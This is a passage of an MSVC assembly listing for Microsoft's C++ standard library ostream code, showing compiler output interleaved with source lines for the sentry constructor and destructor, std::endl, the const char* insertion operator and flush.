; 96   : 
; 97   :             const auto _Tied = _Ostr.tie();

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::tie
	mov	QWORD PTR _Tied$[rsp], rax

; 98   :             if (!_Tied || _Tied == &_Ostr) {

	cmp	QWORD PTR _Tied$[rsp], 0
	je	SHORT $LN4@sentry
	mov	rax, QWORD PTR _Ostr$[rsp]
	cmp	QWORD PTR _Tied$[rsp], rax
	jne	SHORT $LN3@sentry
$LN4@sentry:

; 99   :                 _Ok = true;

	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax+8], 1

; 100  :                 return;

	jmp	SHORT $LN1@sentry
$LN3@sentry:

; 101  :             }
; 102  : 
; 103  :             _Tied->flush();

	mov	rcx, QWORD PTR _Tied$[rsp]
	call	?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush

; 104  :             _Ok = _Ostr.good(); // store test only after flushing tie

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?good@ios_base@std@@QEBA_NXZ		; std::ios_base::good
	mov	rcx, QWORD PTR this$[rsp]
	mov	BYTE PTR [rcx+8], al
$LN1@sentry:

; 105  :         }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Tied$ = 32
this$ = 64
_Ostr$ = 72
?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::sentry::sentry'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::sentry::sentry'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
_Rdbuf$ = 32
tv72 = 40
this$ = 64
??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base, COMDAT

; 77   :         __CLR_OR_THIS_CALL ~_Sentry_base() noexcept { // destroy after unlocking

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 78   :             const auto _Rdbuf = _Myostr.rdbuf();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv72[rsp], rax
	mov	rax, QWORD PTR tv72[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR tv72[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR _Rdbuf$[rsp], rax

; 79   :             if (_Rdbuf) {

	cmp	QWORD PTR _Rdbuf$[rsp], 0
	je	SHORT $LN2@Sentry_bas

; 80   :                 _Rdbuf->_Unlock();

	mov	rax, QWORD PTR _Rdbuf$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Rdbuf$[rsp]
	call	QWORD PTR [rax+16]
	npad	1
$LN2@Sentry_bas:

; 81   :             }
; 82   :         }

	add	rsp, 56					; 00000038H
	ret	0
??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
_TEXT	SEGMENT
_Rdbuf$ = 32
tv73 = 40
this$ = 64
_Ostr$ = 72
??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base, COMDAT

; 70   :         __CLR_OR_THIS_CALL _Sentry_base(basic_ostream& _Ostr) : _Myostr(_Ostr) { // lock the stream buffer, if there

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	mov	QWORD PTR [rax], rcx

; 71   :             const auto _Rdbuf = _Myostr.rdbuf();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv73[rsp], rax
	mov	rax, QWORD PTR tv73[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR tv73[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR _Rdbuf$[rsp], rax

; 72   :             if (_Rdbuf) {

	cmp	QWORD PTR _Rdbuf$[rsp], 0
	je	SHORT $LN2@Sentry_bas

; 73   :                 _Rdbuf->_Lock();

	mov	rax, QWORD PTR _Rdbuf$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Rdbuf$[rsp]
	call	QWORD PTR [rax+8]
$LN2@Sentry_bas:

; 74   :             }
; 75   :         }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Ostr$ = 48
??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z PROC ; std::endl<char,std::char_traits<char> >, COMDAT

; 1005 :     basic_ostream<_Elem, _Traits>& _Ostr) { // insert newline and flush stream

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 1006 :     _Ostr.put(_Ostr.widen('\n'));

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	dl, 10
	mov	rcx, rax
	call	?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z ; std::basic_ios<char,std::char_traits<char> >::widen
	movzx	edx, al
	mov	rcx, QWORD PTR _Ostr$[rsp]
	call	?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z ; std::basic_ostream<char,std::char_traits<char> >::put

; 1007 :     _Ostr.flush();

	mov	rcx, QWORD PTR _Ostr$[rsp]
	call	?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush

; 1008 :     return _Ostr;

	mov	rax, QWORD PTR _Ostr$[rsp]

; 1009 : }

	add	rsp, 40					; 00000028H
	ret	0
??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z ENDP ; std::endl<char,std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
_TEXT	SEGMENT
_State$ = 32
tv294 = 36
tv299 = 37
_Pad$ = 40
_Count$ = 48
tv139 = 56
tv296 = 60
$T1 = 64
$T2 = 68
tv301 = 72
$T3 = 76
$T4 = 80
tv137 = 88
tv295 = 96
tv297 = 104
tv298 = 112
tv300 = 120
$T5 = 128
_Ok$ = 136
_Ostr$ = 176
_Val$ = 184
??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z PROC ; std::operator<<<std::char_traits<char> >, COMDAT

; 761  : basic_ostream<char, _Traits>& operator<<(basic_ostream<char, _Traits>& _Ostr, const char* _Val) {

$LN25:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 168				; 000000a8H

; 762  :     // insert NTBS into char stream
; 763  :     using _Elem = char;
; 764  :     using _Myos = basic_ostream<_Elem, _Traits>;
; 765  : 
; 766  :     ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$[rsp], 0

; 767  :     streamsize _Count        = static_cast<streamsize>(_Traits::length(_Val));

	mov	rcx, QWORD PTR _Val$[rsp]
	call	?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z ; std::_Narrow_char_traits<char,int>::length
	mov	QWORD PTR _Count$[rsp], rax

; 768  :     streamsize _Pad          = _Ostr.width() <= 0 || _Ostr.width() <= _Count ? 0 : _Ostr.width() - _Count;

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	test	rax, rax
	jle	SHORT $LN17@operator
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	cmp	rax, QWORD PTR _Count$[rsp]
	jle	SHORT $LN17@operator
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	sub	rax, QWORD PTR _Count$[rsp]
	mov	QWORD PTR tv137[rsp], rax
	jmp	SHORT $LN18@operator
$LN17@operator:
	mov	QWORD PTR tv137[rsp], 0
$LN18@operator:
	mov	rax, QWORD PTR tv137[rsp]
	mov	QWORD PTR _Pad$[rsp], rax

; 769  :     const typename _Myos::sentry _Ok(_Ostr);

	mov	rdx, QWORD PTR _Ostr$[rsp]
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
	npad	1

; 770  : 
; 771  :     if (!_Ok) {

	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN8@operator

; 772  :         _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 773  :     } else { // state okay, insert

	jmp	$LN9@operator
$LN8@operator:

; 774  :         _TRY_IO_BEGIN
; 775  :         if ((_Ostr.flags() & ios_base::adjustfield) != ios_base::left) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	DWORD PTR tv139[rsp], eax
	mov	eax, DWORD PTR tv139[rsp]
	and	eax, 448				; 000001c0H
	cmp	eax, 64					; 00000040H
	je	$LN11@operator

; 776  :             for (; 0 < _Pad; --_Pad) { // pad on left

	jmp	SHORT $LN4@operator
$LN2@operator:
	mov	rax, QWORD PTR _Pad$[rsp]
	dec	rax
	mov	QWORD PTR _Pad$[rsp], rax
$LN4@operator:
	cmp	QWORD PTR _Pad$[rsp], 0
	jle	$LN11@operator

; 777  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ ; std::basic_ios<char,std::char_traits<char> >::fill
	mov	BYTE PTR tv294[rsp], al
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv295[rsp], rax
	movzx	edx, BYTE PTR tv294[rsp]
	mov	rcx, QWORD PTR tv295[rsp]
	call	?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
	mov	DWORD PTR tv296[rsp], eax
	mov	eax, DWORD PTR tv296[rsp]
	mov	DWORD PTR $T1[rsp], eax
	call	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
	mov	DWORD PTR $T2[rsp], eax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN12@operator

; 778  :                     _State |= ios_base::badbit; // insertion failed, quit

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 779  :                     break;

	jmp	SHORT $LN11@operator
$LN12@operator:

; 780  :                 }
; 781  :             }

	jmp	$LN2@operator
$LN11@operator:

; 782  :         }
; 783  : 
; 784  :         if (_State == ios_base::goodbit && _Ostr.rdbuf()->sputn(_Val, _Count) != _Count) {

	cmp	DWORD PTR _State$[rsp], 0
	jne	SHORT $LN13@operator
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv297[rsp], rax
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Val$[rsp]
	mov	rcx, QWORD PTR tv297[rsp]
	call	?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputn
	mov	QWORD PTR tv298[rsp], rax
	mov	rax, QWORD PTR _Count$[rsp]
	cmp	QWORD PTR tv298[rsp], rax
	je	SHORT $LN13@operator

; 785  :             _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax
$LN13@operator:

; 786  :         }
; 787  : 
; 788  :         if (_State == ios_base::goodbit) {

	cmp	DWORD PTR _State$[rsp], 0
	jne	$LN14@operator

; 789  :             for (; 0 < _Pad; --_Pad) { // pad on right

	jmp	SHORT $LN7@operator
$LN5@operator:
	mov	rax, QWORD PTR _Pad$[rsp]
	dec	rax
	mov	QWORD PTR _Pad$[rsp], rax
$LN7@operator:
	cmp	QWORD PTR _Pad$[rsp], 0
	jle	$LN14@operator

; 790  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ ; std::basic_ios<char,std::char_traits<char> >::fill
	mov	BYTE PTR tv299[rsp], al
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv300[rsp], rax
	movzx	edx, BYTE PTR tv299[rsp]
	mov	rcx, QWORD PTR tv300[rsp]
	call	?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
	mov	DWORD PTR tv301[rsp], eax
	mov	eax, DWORD PTR tv301[rsp]
	mov	DWORD PTR $T3[rsp], eax
	call	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
	mov	DWORD PTR $T4[rsp], eax
	lea	rdx, QWORD PTR $T3[rsp]
	lea	rcx, QWORD PTR $T4[rsp]
	call	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN15@operator

; 791  :                     _State |= ios_base::badbit; // insertion failed, quit

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 792  :                     break;

	jmp	SHORT $LN14@operator
$LN15@operator:

; 793  :                 }
; 794  :             }

	jmp	$LN5@operator
$LN14@operator:

; 795  :         }
; 796  : 
; 797  :         _Ostr.width(0);

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	edx, edx
	mov	rcx, rax
	call	?width@ios_base@std@@QEAA_J_J@Z		; std::ios_base::width
	npad	1
	jmp	SHORT $LN9@operator
$LN23@operator:
$LN9@operator:

; 798  :         _CATCH_IO_(ios_base, _Ostr)
; 799  :     }
; 800  : 
; 801  :     _Ostr.setstate(_State);

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate

; 802  :     return _Ostr;

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	QWORD PTR $T5[rsp], rax
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	mov	rax, QWORD PTR $T5[rsp]

; 803  : }

	add	rsp, 168				; 000000a8H
	ret	0
??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z ENDP ; std::operator<<<std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv294 = 36
tv299 = 37
_Pad$ = 40
_Count$ = 48
tv139 = 56
tv296 = 60
$T1 = 64
$T2 = 68
tv301 = 72
$T3 = 76
$T4 = 80
tv137 = 88
tv295 = 96
tv297 = 104
tv298 = 112
tv300 = 120
$T5 = 128
_Ok$ = 136
_Ostr$ = 176
_Val$ = 184
?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA PROC ; `std::operator<<<std::char_traits<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$[rbp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA ENDP ; `std::operator<<<std::char_traits<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv294 = 36
tv299 = 37
_Pad$ = 40
_Count$ = 48
tv139 = 56
tv296 = 60
$T1 = 64
$T2 = 68
tv301 = 72
$T3 = 76
$T4 = 80
tv137 = 88
tv295 = 96
tv297 = 104
tv298 = 112
tv300 = 120
$T5 = 128
_Ok$ = 136
_Ostr$ = 176
_Val$ = 184
?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA PROC ; `std::operator<<<std::char_traits<char> >'::`1'::catch$1

; 798  :         _CATCH_IO_(ios_base, _Ostr)

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z$0:
	mov	rax, QWORD PTR _Ostr$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
	lea	rax, $LN23@catch$1
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA ENDP ; `std::operator<<<std::char_traits<char> >'::`1'::catch$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
_TEXT	SEGMENT
_State$1 = 32
tv78 = 36
_Rdbuf$ = 40
_Ok$2 = 48
this$ = 80
?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::flush, COMDAT

; 555  :     basic_ostream& __CLR_OR_THIS_CALL flush() { // flush output stream

$LN13:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 556  :         const auto _Rdbuf = _Myios::rdbuf();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR _Rdbuf$[rsp], rax

; 557  :         if (_Rdbuf) { // buffer exists, flush it

	cmp	QWORD PTR _Rdbuf$[rsp], 0
	je	SHORT $LN2@flush

; 558  :             const sentry _Ok(*this);

	mov	rdx, QWORD PTR this$[rsp]
	lea	rcx, QWORD PTR _Ok$2[rsp]
	call	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
	npad	1

; 559  : 
; 560  :             if (_Ok) {

	lea	rcx, QWORD PTR _Ok$2[rsp]
	call	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN3@flush

; 561  :                 ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$1[rsp], 0

; 562  :                 _TRY_IO_BEGIN
; 563  :                 if (_Rdbuf->pubsync() == -1) {

	mov	rcx, QWORD PTR _Rdbuf$[rsp]
	call	?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
	mov	DWORD PTR tv78[rsp], eax
	cmp	DWORD PTR tv78[rsp], -1
	jne	SHORT $LN5@flush

; 564  :                     _State |= ios_base::badbit; // sync failed

	mov	eax, DWORD PTR _State$1[rsp]
	or	eax, 4
	mov	DWORD PTR _State$1[rsp], eax
$LN5@flush:
	jmp	SHORT $LN10@flush
$LN11@flush:
$LN10@flush:

; 565  :                 }
; 566  :                 _CATCH_IO_END
; 567  :                 _Myios::setstate(_State);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$1[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
$LN3@flush:

; 568  :             }
; 569  :         }

	lea	rcx, QWORD PTR _Ok$2[rsp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
$LN2@flush:

; 570  :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 571  :     }

	add	rsp, 72					; 00000048H
	ret	0
?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::flush
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$1 = 32
tv78 = 36
_Rdbuf$ = 40
_Ok$2 = 48
this$ = 80
?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::flush'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$2[rbp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
